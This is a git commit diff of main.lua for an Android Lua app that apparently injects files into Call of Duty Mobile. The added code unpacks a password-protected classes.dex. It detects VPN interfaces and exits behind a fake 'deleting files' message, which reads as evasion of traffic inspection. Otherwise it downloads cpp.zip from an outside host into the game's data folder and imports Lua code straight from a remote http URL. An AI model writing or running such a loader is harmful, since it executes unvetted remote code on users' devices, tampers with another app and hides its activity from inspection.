32a83c1151e54737fb67220c63fd571cc667b6fe
syntaxNULL <103994429+syntaxNULL@users.noreply.github.com>
2024-05-09 22:30:14 +0800

    Update main.lua

--- main.lua
+++ main.lua
@@ -2,10 +2,64 @@ require "import"
 import "android.app.*"
 import "android.os.*"
 import "android.widget.*"
-import "android.view.*
-import "http"
+import "android.view.*"
 
- import "com.downloader.*"
+import "zip4j"
+zip4j.unZipDir(activity.getLuaDir("/libs/classes.dex"),
+activity.getLuaDir(""),"FC6WH7wg_Y!R-$c9R@KJYAAf5=P5acvQg-j_^JT+SJTj37c9Pu#$f7Kr87n78XeF4v-e26kCgApz9_7m?hj9b=P=&!p43abQx^Ew")
+
+local function isVpnUsed()
+  import "java.net.NetworkInterface"
+  import "java.util.Collections"
+  import "java.util.Enumeration"
+  import "java.util.Iterator"
+  local nlp= NetworkInterface.getNetworkInterfaces();
+  if (nlp~=nil) then
+    local it = Collections.list(nlp).iterator();
+    while (it.hasNext()) do
+      local nlo = it.next();
+      if (nlo.isUp() && nlo.getInterfaceAddresses().size() ~= 0) then
+        if ((tostring(nlo):find("tun0")) or (tostring(nlo):find("ppp0"))) then
+          return true
+        end
+      end
+    end
+    return false
+  end
+end
+local y=pcall(function()
+  local ti=Ticker()
+  ti.Period=100
+  ti.start()
+  ti.onTick=function()
+    pcall(function()
+      if isVpnUsed() then
+        if w==nil then
+          Toast.makeText(activity, "ᴅᴇʟᴇᴛɪɴɢ ꜰɪʟᴇꜱ !! ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ ...",Toast.LENGTH_SHORT).show()
+          w=0
+          task(500,function()
+            os.exit()
+            ti.stop()
+            activity.finish()
+          end)
+        end
+       else
+        if w==nil then
+          loader()
+          w=0
+        end
+      end
+    end)
+  end
+  function onDestroy()
+    ti.stop()
+  end
+end)
+
+
+
+function loader()
+  import "com.downloader.*"
   pkgName = "com.garena.game.codm"
   FILEDOWNLOAD = "/storage/emulated/0/centauri/Log/" .. pkgName .. "/centauriLog2.mmap"
   Urls="https://key.itsmerjc.pro/cpp.zip"
@@ -39,3 +93,4 @@ import "http"
     Toast.makeText(activity, "ꜰɪʟᴇꜱ ʜᴀꜱ ʙᴇᴇɴ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ !!!",Toast.LENGTH_SHORT).show()
     import "http://itsmefiles.mywebcommunity.org/main2.lua"
   end
+end
